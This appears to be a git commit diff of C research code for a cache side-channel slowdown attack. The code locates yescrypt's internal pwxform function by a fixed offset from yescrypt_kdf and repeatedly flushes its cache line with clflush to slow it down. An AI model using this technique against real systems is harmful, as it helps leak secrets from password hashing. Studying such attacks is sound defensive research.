c0781bc49eb8b48bd6511afd7add8ccad762ca1f
Simojoviz <simonejov@gmail.com>
2025-05-21 14:42:01 +0200

    cache-slowdown updated

--- side-channel/cache-slowdown.c
+++ side-channel/cache-slowdown.c
@@ -5,40 +5,20 @@
 #include <sys/mman.h>
 #include "constants.h"
 
-#define REPEAT 20
 
 void clflush(uint64_t addr)
 {
     asm volatile ("clflush (%0)"::"r"(addr));
 }
 
-uint32_t measure_one_block_access_time(uint64_t addr)
-{
-	uint32_t cycles;
-
-	asm volatile("mov %1, %%r8\n\t"
-	"lfence\n\t"
-	"rdtsc\n\t"
-	"mov %%eax, %%edi\n\t"
-	"mov (%%r8), %%r8\n\t"
-	"lfence\n\t"
-	"rdtsc\n\t"
-	"sub %%edi, %%eax\n\t"
-	: "=a"(cycles) /*output*/
-	: "r"(addr)
-	: "r8", "edi");	
-
-	return cycles;
-}
-
-void wait_cycles(uint64_t cycles){
-    uint64_t start, end;
-    __asm__ volatile("lfence\n\t"
-    "rdtsc\n\t"
-    : "=a"(start));
+static inline void wait_cycles(uint64_t cycles){
+    uint32_t start, end;
+    __asm__ volatile(
+        "rdtsc\n\t"
+        : "=a"(start));
 
     do {
-        __asm__ volatile("lfence\n\t"
+        __asm__ volatile(
             "rdtsc\n\t"
             : "=a"(end));
     }while (end-start < cycles);
@@ -58,15 +38,15 @@ void get_eviction_set(void *buf, void **eviction_set, uint64_t set) {
 
 int main() {
     uint32_t t;
-    void *handle_libyescrypt = dlopen("../libyescrypt-ref.so", RTLD_LAZY);
+    void *handle_libyescrypt = dlopen("./libyescrypt-ref.so", RTLD_LAZY);
     void (*yescrypt_kdf)() = dlsym(handle_libyescrypt, "yescrypt_kdf");
 
-    //pay attention on portion of code inside the cache line
+    //pay attention on portion of code inside the cache line, if you want less slowdown flush 0x10(?) byte down
     void (*pwxform)() = yescrypt_kdf - 0x14ed; 
     
     do {
-        clflush((uint64_t) pwxform);
         mfence();
+        clflush((uint64_t) pwxform);
         //clflush((uint64_t) pwxform);
         //mfence();
         //wait_cycles(500);
